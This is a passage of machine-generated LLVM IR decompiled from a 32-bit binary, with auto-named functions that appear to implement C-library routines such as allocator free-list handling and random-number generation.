  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10007f94, { 1, 0 }
  uselistorder i32 %v2_10007f68, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10007fd4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_10007fbc, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 1, 2, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007fc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007f94, { 1, 0 }
  uselistorder label %dec_label_pc_10007f68, { 1, 0 }
  uselistorder label %dec_label_pc_10007fd8.preheader, { 1, 0 }
}

define i32 @function_10007fe8(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007fe8:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10007fe8 = icmp eq i32 %arg3, 0
  %v2_10007fec = add i32 %arg2, 4
  %v3_10007fec = inttoptr i32 %v2_10007fec to i32*
  store i32 %arg4, i32* %v3_10007fec, align 4
  %v2_10007ff0 = add i32 %arg2, 8
  %v3_10007ff0 = inttoptr i32 %v2_10007ff0 to i32*
  store i32 %arg3, i32* %v3_10007ff0, align 4
  br i1 %v3_10007fe8, label %dec_label_pc_10008000, label %dec_label_pc_10007ff8

dec_label_pc_10007ff8:                            ; preds = %dec_label_pc_10007fe8
  %v2_10007ff8 = add i32 %arg3, 4
  %v3_10007ff8 = inttoptr i32 %v2_10007ff8 to i32*
  store i32 %arg2, i32* %v3_10007ff8, align 4
  br label %dec_label_pc_10008004

dec_label_pc_10008000:                            ; preds = %dec_label_pc_10007fe8
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10008004

dec_label_pc_10008004:                            ; preds = %dec_label_pc_10007ff8, %dec_label_pc_10008000
  %v3_10008004 = icmp eq i32 %arg4, 0
  %v0_10008008 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10008004, i32 %v0_10008008)
  %v2_1000800c = add i32 %arg4, 8
  %v3_1000800c = inttoptr i32 %v2_1000800c to i32*
  store i32 %arg2, i32* %v3_1000800c, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10008004, { 1, 0 }
}

define i32 @function_10008014(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008014:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10008014 = icmp eq i32 %arg3, 0
  br i1 %v3_10008014, label %dec_label_pc_10008024, label %dec_label_pc_1000801c

dec_label_pc_1000801c:                            ; preds = %dec_label_pc_10008014
  %v2_1000801c = add i32 %arg3, 4
  %v3_1000801c = inttoptr i32 %v2_1000801c to i32*
  store i32 %arg2, i32* %v3_1000801c, align 4
  br label %dec_label_pc_10008028

dec_label_pc_10008024:                            ; preds = %dec_label_pc_10008014
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10008028

dec_label_pc_10008028:                            ; preds = %dec_label_pc_1000801c, %dec_label_pc_10008024
  %v2_10008028 = add i32 %arg2, 8
  %v3_10008028 = inttoptr i32 %v2_10008028 to i32*
  store i32 %arg3, i32* %v3_10008028, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008028, { 1, 0 }
}

define i32 @function_10008030(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008030:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10008048 = load i32, i32* %arg1, align 4
  store i32 %v2_10008048, i32* @r31, align 4
  %v2_1000804c = add i32 %arg3, %arg2
  store i32 %v2_1000804c, i32* %r3.global-to-local, align 4
  %v3_100080607 = icmp eq i32 %v2_10008048, 0
  %v1_100080648 = add i32 %v2_10008048, 12
  %tmp69 = icmp uge i32 %v1_100080648, %arg2
  %or.cond10 = or i1 %v3_100080607, %tmp69
  br i1 %or.cond10, label %dec_label_pc_10008070, label %dec_label_pc_10008058

dec_label_pc_10008058:                            ; preds = %dec_label_pc_10008030, %dec_label_pc_10008058
  %v0_100080b811 = phi i32 [ %v3_1000805c, %dec_label_pc_10008058 ], [ %v2_10008048, %dec_label_pc_10008030 ]
  store i32 %v0_100080b811, i32* %r11.global-to-local, align 4
  %v1_1000805c = add i32 %v0_100080b811, 4
  %v2_1000805c = inttoptr i32 %v1_1000805c to i32*
  %v3_1000805c = load i32, i32* %v2_1000805c, align 4
  store i32 %v3_1000805c, i32* @r31, align 4
  %v3_10008060 = icmp eq i32 %v3_1000805c, 0
  %v1_10008064 = add i32 %v3_1000805c, 12
  %tmp6 = icmp uge i32 %v1_10008064, %arg2
  %or.cond = or i1 %v3_10008060, %tmp6
  br i1 %or.cond, label %dec_label_pc_10008070, label %dec_label_pc_10008058

dec_label_pc_10008070:                            ; preds = %dec_label_pc_10008058, %dec_label_pc_10008030
  %v0_100080ac.lcssa = phi i32 [ 0, %dec_label_pc_10008030 ], [ %v0_100080b811, %dec_label_pc_10008058 ]
  %v0_100080b8.lcssa = phi i32 [ %v2_10008048, %dec_label_pc_10008030 ], [ %v3_1000805c, %dec_label_pc_10008058 ]
  %v3_10008060.lcssa = phi i1 [ %v3_100080607, %dec_label_pc_10008030 ], [ %v3_10008060, %dec_label_pc_10008058 ]
  br i1 %v3_10008060.lcssa, label %dec_label_pc_10008128, label %dec_label_pc_10008078

dec_label_pc_10008078:                            ; preds = %dec_label_pc_10008070
  %v1_10008078 = inttoptr i32 %v0_100080b8.lcssa to i32*
  %v2_10008078 = load i32, i32* %v1_10008078, align 4
  %v2_1000807c = sub i32 %v0_100080b8.lcssa, %v2_10008078
  %v1_10008080 = add i32 %v2_1000807c, 12
  %v3_10008084 = icmp ugt i32 %v1_10008080, %v2_1000804c
  br i1 %v3_10008084, label %dec_label_pc_10008128, label %dec_label_pc_1000808c

dec_label_pc_1000808c:                            ; preds = %dec_label_pc_10008078
  %v4_10008084 = icmp eq i32 %v1_10008080, %v2_1000804c
  %v2_10008090 = add i32 %v2_10008078, %arg3
  store i32 %v2_10008090, i32* @r29, align 4
  br i1 %v4_10008084, label %dec_label_pc_10008098, label %dec_label_pc_100080c8

dec_label_pc_10008098:                            ; preds = %dec_label_pc_1000808c
  %v3_10008098 = icmp eq i32 %v0_100080ac.lcssa, 0
  br i1 %v3_10008098, label %dec_label_pc_1000811c, label %dec_label_pc_100080a0

dec_label_pc_100080a0:                            ; preds = %dec_label_pc_10008098
  %v1_100080a0 = add i32 %v0_100080ac.lcssa, 12
  %v4_100080a4 = icmp eq i32 %v1_100080a0, %arg2
  br i1 %v4_100080a4, label %dec_label_pc_100080ac, label %dec_label_pc_1000811c

dec_label_pc_100080ac:                            ; preds = %dec_label_pc_100080a0
  %v1_100080ac = inttoptr i32 %v0_100080ac.lcssa to i32*
  %v2_100080ac = load i32, i32* %v1_100080ac, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100080b4 = add i32 %v0_100080ac.lcssa, 8
  %v2_100080b4 = inttoptr i32 %v1_100080b4 to i32*
  %v3_100080b4 = load i32, i32* %v2_100080b4, align 4
  %v2_100080bc = add i32 %v2_100080ac, %v2_10008090
  store i32 %v2_100080bc, i32* @r29, align 4
  %v5_100080c0 = call i32 @function_10008014(i32* %arg1, i32 %v0_100080b8.lcssa, i32 %v3_100080b4, i32 %v2_1000804c)
  store i32 %v5_100080c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000811c

dec_label_pc_100080c8:                            ; preds = %dec_label_pc_1000808c
  %v1_100080c8 = add i32 %v0_100080b8.lcssa, 4
  %v2_100080c8 = inttoptr i32 %v1_100080c8 to i32*
  %v3_100080c8 = load i32, i32* %v2_100080c8, align 4
  %v3_100080cc = icmp eq i32 %v3_100080c8, 0
  br i1 %v3_100080cc, label %dec_label_pc_10008104, label %dec_label_pc_100080d4

dec_label_pc_100080d4:                            ; preds = %dec_label_pc_100080c8
  %v1_100080d4 = inttoptr i32 %v3_100080c8 to i32*
  %v2_100080d4 = load i32, i32* %v1_100080d4, align 4
  %v2_100080d8 = sub i32 %v3_100080c8, %v2_100080d4
  %v1_100080dc = add i32 %v2_100080d8, 12
  %v4_100080e0 = icmp eq i32 %v2_1000804c, %v1_100080dc
  br i1 %v4_100080e0, label %dec_label_pc_100080e8, label %dec_label_pc_10008104

dec_label_pc_100080e8:                            ; preds = %dec_label_pc_100080d4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_100080f4 = add i32 %v2_100080d4, %v2_10008090
  store i32 %v2_100080f4, i32* @r29, align 4
  store i32 %v3_100080c8, i32* @r31, align 4
  %v5_100080fc = call i32 @function_10008014(i32* %arg1, i32 %v3_100080c8, i32 %v0_100080ac.lcssa, i32 %v2_1000804c)
  store i32 %v5_100080fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000811c

dec_label_pc_10008104:                            ; preds = %dec_label_pc_100080d4, %dec_label_pc_100080c8
  %v2_10008104 = add i32 %v0_100080b8.lcssa, %arg3
  store i32 %v2_10008104, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268468508, i32* @lr, align 4
  %v5_10008118 = call i32 @function_10007fe8(i32* %arg1, i32 %v2_10008104, i32 %v0_100080ac.lcssa, i32 %v3_100080c8)
  store i32 %v5_10008118, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000811c

dec_label_pc_1000811c:                            ; preds = %dec_label_pc_100080a0, %dec_label_pc_10008098, %dec_label_pc_100080e8, %dec_label_pc_100080ac, %dec_label_pc_10008104
  %v0_1000811c = load i32, i32* @r31, align 4
  store i32 %v0_1000811c, i32* @r30, align 4
  %v0_10008120 = load i32, i32* @r29, align 4
  %v2_10008120 = inttoptr i32 %v0_1000811c to i32*
  store i32 %v0_10008120, i32* %v2_10008120, align 4
  br label %dec_label_pc_10008144

dec_label_pc_10008128:                            ; preds = %dec_label_pc_10008078, %dec_label_pc_10008070
  %v2_10008128 = add i32 %v2_1000804c, -12
  %v3_10008128 = inttoptr i32 %v2_10008128 to i32*
  store i32 %arg3, i32* %v3_10008128, align 4
  %v0_1000812c = load i32, i32* %r3.global-to-local, align 4
  %v1_1000812c = add i32 %v0_1000812c, -12
  store i32 %v1_1000812c, i32* @r30, align 4
  %v0_10008130 = load i32, i32* %r11.global-to-local, align 4
  %v0_10008134 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10008134, i32* %r3.global-to-local, align 4
  %v0_10008138 = load i32, i32* @r31, align 4
  store i32 268468548, i32* @lr, align 4
  %v4_10008140 = inttoptr i32 %v0_10008134 to i32*
  %v5_10008140 = call i32 @function_10007fe8(i32* %v4_10008140, i32 %v1_1000812c, i32 %v0_10008130, i32 %v0_10008138)
  store i32 %v5_10008140, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008144

dec_label_pc_10008144:                            ; preds = %dec_label_pc_1000811c, %dec_label_pc_10008128
  %v0_10008148 = load i32, i32* @r30, align 4
  store i32 %v0_10008148, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008148

; uselistorder directives
  uselistorder i32 %v3_100080c8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_10008080, { 1, 0 }
  uselistorder i32 %v0_100080b8.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_100080ac.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000805c, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000804c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10008144, { 1, 0 }
  uselistorder label %dec_label_pc_1000811c, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10008058, { 1, 0 }
}

define i32 @function_1000815c() local_unnamed_addr {
dec_label_pc_1000815c:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_10008174 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_10010310.265 to i32), i32* @r29, align 4
  store i32 %v2_10008174, i32* @r3, align 4
  %v0_1000818c = call i32 @function_10008c84()
  %v0_10008194 = call i32 @function_10008c7c()
  %v2_1000819c = ptrtoint i32* %stack_var_-56 to i32
  %v3_100081a4 = call i32 @function_10008438(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 808) to i32*), i32 %v2_1000819c)
  store i32 %v2_10008174, i32* @r3, align 4
  %v0_100081b0 = call i32 @function_10008c84()
  %v3_100081b8 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_100081b8
}

define i32 @function_100081cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_100081cc:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010310.265 to i32), i32* %r29.global-to-local, align 4
  %v2_100081f0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100081f0, i32* @r3, align 4
  %v0_100081f8 = call i32 @function_10008c84()
  %v0_10008200 = call i32 @function_10008c7c()
  store i32 268468764, i32* @lr, align 4
  %v3_10008218 = call i32 @function_10008344(i32 %arg1, i32* nonnull @global_var_10010328)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10008220 = icmp slt i32 %v3_10008218, 0
  store i32 %v2_100081f0, i32* @r3, align 4
  br i1 %v1_10008220, label %dec_label_pc_10008234, label %dec_label_pc_10008230

dec_label_pc_10008230:                            ; preds = %dec_label_pc_100081cc
  store i32 ptrtoint (i32** @global_var_1001032c.269 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008234

dec_label_pc_10008234:                            ; preds = %dec_label_pc_100081cc, %dec_label_pc_10008230
  %v0_10008234 = call i32 @function_10008c84()
  %v0_1000823c = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000823c

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10008234, { 1, 0 }
}

define i32 @function_10008250(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10008250:
  %stack_var_-56 = alloca i32, align 4
  %v2_10008260 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10008260, i32* @r3, align 4
  %v0_10008288 = call i32 @function_10008c84()
  %v0_10008290 = call i32 @function_10008c7c()
  store i32 %arg1, i32* @r3, align 4
  store i32 268468912, i32* @lr, align 4
  %v4_100082ac = inttoptr i32 %arg1 to i32*
  %v5_100082ac = call i32 @function_100085ac(i32* %v4_100082ac, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_10010328 to i32))
  store i32 %v2_10008260, i32* @r3, align 4
  %v0_100082b8 = call i32 @function_10008c84()
  ret i32 ptrtoint (i32** @global_var_1001032c.269 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_100082d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100082d8:
  %stack_var_-40 = alloca i32, align 4
  %v2_100082ec = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100082ec, i32* @r3, align 4
  %v0_10008308 = call i32 @function_10008c84()
  %v0_10008310 = call i32 @function_10008c7c()
  store i32 ptrtoint (i32* @global_var_10010328 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268469028, i32* @lr, align 4
  %v0_10008320 = call i32 @function_100084c8()
  store i32 %v2_100082ec, i32* @r3, align 4
  %v0_1000832c = call i32 @function_10008c84()
  ret i32 %v0_1000832c

; uselistorder directives
  uselistorder i32* @global_var_10010328, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10010328 to i32), { 1, 0 }
}

define i32 @function_10008344(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10008344:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10008344 = add i32 %tmp, 12
  %v2_10008344 = inttoptr i32 %v1_10008344 to i32*
  %v3_10008344 = load i32, i32* %v2_10008344, align 4
  store i32 %v3_10008344, i32* %r11.global-to-local, align 4
  %v0_10008348 = load i32, i32* @lr, align 4
  store i32 %v0_10008348, i32* %r0.global-to-local, align 4
  %v1_10008350 = add i32 %arg1, 4
  store i32 %v1_10008350, i32* %r3.global-to-local, align 4
  %v3_10008354 = icmp eq i32 %v3_10008344, 0
  %v1_10008358 = add i32 %tmp, 8
  %v2_10008358 = inttoptr i32 %v1_10008358 to i32*
  %v3_10008358 = load i32, i32* %v2_10008358, align 4
  store i32 %v3_10008358, i32* %r9.global-to-local, align 4
  br i1 %v3_10008354, label %dec_label_pc_10008364, label %dec_label_pc_1000836c

dec_label_pc_10008364:                            ; preds = %dec_label_pc_10008344
  %v2_10008364 = add i32 %v3_10008358, -4
  %v3_10008364 = inttoptr i32 %v2_10008364 to i32*
  store i32 0, i32* %v3_10008364, align 4
  br label %dec_label_pc_10008384

dec_label_pc_1000836c:                            ; preds = %dec_label_pc_10008344
  %v1_1000836c = add i32 %tmp, 4
  %v2_1000836c = inttoptr i32 %v1_1000836c to i32*
  %v3_1000836c = load i32, i32* %v2_1000836c, align 4
  %v2_10008370 = sub i32 %v3_1000836c, %v3_10008358
  %v4_10008374 = sdiv i32 %v2_10008370, 4
  %v1_10008378 = mul i32 %v4_10008374, 5
  %v2_1000837c = add i32 %v1_10008378, %v3_10008344
  store i32 %v2_1000837c, i32* %r0.global-to-local, align 4
  %v2_10008380 = add i32 %v3_10008358, -4
  %v3_10008380 = inttoptr i32 %v2_10008380 to i32*
  store i32 %v2_1000837c, i32* %v3_10008380, align 4
  br label %dec_label_pc_10008384

dec_label_pc_10008384:                            ; preds = %dec_label_pc_10008364, %dec_label_pc_1000836c
  %v0_10008384 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008384 = add i32 %v0_10008384, -4
  %v2_10008384 = inttoptr i32 %v1_10008384 to i32*
  %v3_10008384 = load i32, i32* %v2_10008384, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000ec68.270 to i32), i32* %r9.global-to-local, align 4
  %v2_10008394 = srem i32 %v3_10008384, 5
  store i32 %v2_10008394, i32* %r11.global-to-local, align 4
  %v2_100083a4 = icmp ugt i32 %v2_10008394, 4
  %v1_100083a8 = mul nsw i32 %v2_10008394, 4
  store i32 %v1_100083a8, i32* %r0.global-to-local, align 4
  %v2_100083b0 = add i32 %v1_100083a8, ptrtoint (i32* @global_var_1000ec68.270 to i32)
  store i32 %v2_100083b0, i32* %r10.global-to-local, align 4
  br i1 %v2_100083a4, label %dec_label_pc_10008414, label %dec_label_pc_100083b8

dec_label_pc_100083b8:                            ; preds = %dec_label_pc_10008384
  %v3_100083ac = icmp eq i32 %v2_10008394, 0
  %v1_100083b8 = add i32 %v1_100083a8, add (i32 ptrtoint (i32* @global_var_1000ec68.270 to i32), i32 20)
  %v2_100083b8 = inttoptr i32 %v1_100083b8 to i32*
  %v3_100083b8 = load i32, i32* %v2_100083b8, align 4
  store i32 %v3_100083b8, i32* %r10.global-to-local, align 4
  %v3_100083bc = inttoptr i32 %v2_100083b0 to i32*
  %v4_100083bc = load i32, i32* %v3_100083bc, align 4
  store i32 %v4_100083bc, i32* %r9.global-to-local, align 4
  %v1_100083c0 = mul i32 %v3_100083b8, 4
  store i32 %v1_100083c0, i32* %r0.global-to-local, align 4
  %v2_100083c4 = add i32 %tmp, 16
  %v3_100083c4 = inttoptr i32 %v2_100083c4 to i32*
  store i32 %v3_100083b8, i32* %v3_100083c4, align 4
  %v0_100083c8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100083c8 = add i32 %tmp, 20
  %v3_100083c8 = inttoptr i32 %v2_100083c8 to i32*
  store i32 %v0_100083c8, i32* %v3_100083c8, align 4
  %v0_100083cc = load i32, i32* %r3.global-to-local, align 4
  %v1_100083cc = load i32, i32* %r0.global-to-local, align 4
  %v2_100083cc = add i32 %v1_100083cc, %v0_100083cc
  store i32 %v2_100083cc, i32* %r8.global-to-local, align 4
  %v0_100083d0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100083d0, i32* %v2_10008344, align 4
  br i1 %v3_100083ac, label %dec_label_pc_10008408, label %dec_label_pc_100083d8

dec_label_pc_100083d8:                            ; preds = %dec_label_pc_100083b8
  %v0_100083d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100083d8 = add i32 %v0_100083d8, -4
  %v2_100083d8 = inttoptr i32 %v1_100083d8 to i32*
  %v3_100083d8 = load i32, i32* %v2_100083d8, align 4
  %v1_100083dc = load i32, i32* %r7.global-to-local, align 4
  %v2_100083dc = sdiv i32 %v3_100083d8, %v1_100083dc
  %v1_100083e0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100083e0 = add i32 %v1_100083e0, %v2_100083dc
  store i32 %v2_100083e0, i32* %r9.global-to-local, align 4
  %v1_100083e4 = mul i32 %v2_100083dc, 4
  %v1_100083e8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100083e8 = sdiv i32 %v2_100083e0, %v1_100083e8
  store i32 %v2_100083e8, i32* %r11.global-to-local, align 4
  %v2_100083ec = add i32 %v1_100083e4, %v0_100083d8
  store i32 %v2_100083ec, i32* %r0.global-to-local, align 4
  %v2_100083f0 = add i32 %tmp, 4
  %v3_100083f0 = inttoptr i32 %v2_100083f0 to i32*
  store i32 %v2_100083ec, i32* %v3_100083f0, align 4
  %v0_100083f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100083f4 = load i32, i32* %r10.global-to-local, align 4
  %v2_100083f4 = mul i32 %v1_100083f4, %v0_100083f4
  store i32 %v2_100083f4, i32* %r11.global-to-local, align 4
  %v1_100083f8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100083f8 = sub i32 %v1_100083f8, %v2_100083f4
  %v1_100083fc = mul i32 %v2_100083f8, 4
  %v0_10008400 = load i32, i32* %r3.global-to-local, align 4
  %v2_10008400 = add i32 %v1_100083fc, %v0_10008400
  store i32 %v2_10008400, i32* %r9.global-to-local, align 4
  store i32 %v2_10008400, i32* %arg2, align 4
  br label %dec_label_pc_10008408

dec_label_pc_10008408:                            ; preds = %dec_label_pc_100083b8, %dec_label_pc_100083d8
  %v0_10008408 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008408 = add i32 %tmp, 24
  %v3_10008408 = inttoptr i32 %v2_10008408 to i32*
  store i32 %v0_10008408, i32* %v3_10008408, align 4
  %v0_1000840c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000840c, i32* %v2_10008358, align 4
  %v0_10008428.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10008424

dec_label_pc_10008414:                            ; preds = %dec_label_pc_10008384
  %v0_10008414 = call i32 @function_10004b48()
  store i32 %v0_10008414, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000841c = inttoptr i32 %v0_10008414 to i32*
  store i32 22, i32* %v2_1000841c, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10008424

dec_label_pc_10008424:                            ; preds = %dec_label_pc_10008408, %dec_label_pc_10008414
  %v0_10008428 = phi i32 [ %v0_10008428.pre, %dec_label_pc_10008408 ], [ -1, %dec_label_pc_10008414 ]
  store i32 %v0_10008348, i32* %r0.global-to-local, align 4
  store i32 %v0_10008428, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008428

; uselistorder directives
  uselistorder i32 %v0_10008428, { 1, 0 }
  uselistorder i32 %v3_100083b8, { 1, 0, 2 }
  uselistorder i32 %v1_100083a8, { 2, 1, 0 }
  uselistorder i32 %v2_10008394, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 4, 0, 2, 5, 1, 3, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_10008424, { 1, 0 }
  uselistorder label %dec_label_pc_10008408, { 1, 0 }
  uselistorder label %dec_label_pc_10008384, { 1, 0 }
}

define i32 @function_10008438(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008438:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10008438 = add i32 %tmp, 12
  %v2_10008438 = inttoptr i32 %v1_10008438 to i32*
  %v3_10008438 = load i32, i32* %v2_10008438, align 4
  %v1_10008444 = add i32 %tmp, 8
  %v2_10008444 = inttoptr i32 %v1_10008444 to i32*
  %v3_10008444 = load i32, i32* %v2_10008444, align 4
  store i32 %v3_10008444, i32* %r7.global-to-local, align 4
  %v3_10008448 = icmp eq i32 %v3_10008438, 0
  br i1 %v3_10008448, label %dec_label_pc_10008450, label %dec_label_pc_1000846c

dec_label_pc_10008450:                            ; preds = %dec_label_pc_10008438
  %v1_10008450 = inttoptr i32 %v3_10008444 to i32*
  %v2_10008450 = load i32, i32* %v1_10008450, align 4
  %v2_10008454 = mul i32 %v2_10008450, 1103515245
  %v1_10008458 = add i32 %v2_10008454, 12345
  %v1_1000845c = urem i32 %v1_10008458, -2147483648
  store i32 %v1_1000845c, i32* %r9.global-to-local, align 4
  store i32 %v1_1000845c, i32* %v1_10008450, align 4
  %v0_10008464 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008464 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10008464, i32* %v2_10008464, align 4
  br label %dec_label_pc_100084c0

dec_label_pc_1000846c:                            ; preds = %dec_label_pc_10008438
  %v2_1000846c = load i32, i32* %arg1, align 4
  %v1_10008470 = add i32 %tmp, 4
  %v2_10008470 = inttoptr i32 %v1_10008470 to i32*
  %v3_10008470 = load i32, i32* %v2_10008470, align 4
  store i32 %v3_10008470, i32* %r9.global-to-local, align 4
  %v1_10008474 = add i32 %tmp, 24
  %v2_10008474 = inttoptr i32 %v1_10008474 to i32*
  %v3_10008474 = load i32, i32* %v2_10008474, align 4
  %v1_10008478 = add i32 %v2_1000846c, 4
  store i32 %v1_10008478, i32* %r8.global-to-local, align 4
  %v1_1000847c = add i32 %v3_10008470, 4
  %v1_10008480 = inttoptr i32 %v3_10008470 to i32*
  %v2_10008480 = load i32, i32* %v1_10008480, align 4
  store i32 %v2_10008480, i32* %r9.global-to-local, align 4
  %v2_10008484 = icmp ult i32 %v1_10008478, %v3_10008474
  %v1_1000848c = inttoptr i32 %v2_1000846c to i32*
  %v2_1000848c = load i32, i32* %v1_1000848c, align 4
  store i32 %v1_1000847c, i32* %r10.global-to-local, align 4
  %v2_10008494 = add i32 %v2_1000848c, %v2_10008480
  %v1_10008498 = udiv i32 %v2_10008494, 2
  store i32 %v1_10008498, i32* %r9.global-to-local, align 4
  store i32 %v2_10008494, i32* %v1_1000848c, align 4
  %v0_100084a0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100084a0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_100084a0, i32* %v2_100084a0, align 4
  br i1 %v2_10008484, label %dec_label_pc_100084b0, label %dec_label_pc_100084a8

dec_label_pc_100084a8:                            ; preds = %dec_label_pc_1000846c
  %v0_100084a8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100084a8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100084b8

dec_label_pc_100084b0:                            ; preds = %dec_label_pc_1000846c
  %v2_10008488 = icmp ult i32 %v1_1000847c, %v3_10008474
  br i1 %v2_10008488, label %dec_label_pc_100084b8, label %dec_label_pc_100084b4

dec_label_pc_100084b4:                            ; preds = %dec_label_pc_100084b0
  %v0_100084b4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100084b4, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100084b8

dec_label_pc_100084b8:                            ; preds = %dec_label_pc_100084b0, %dec_label_pc_100084a8, %dec_label_pc_100084b4
  %v0_100084b8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100084b8, i32* %v2_10008470, align 4
  %v0_100084bc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_100084bc, i32* %arg1, align 4
  br label %dec_label_pc_100084c0

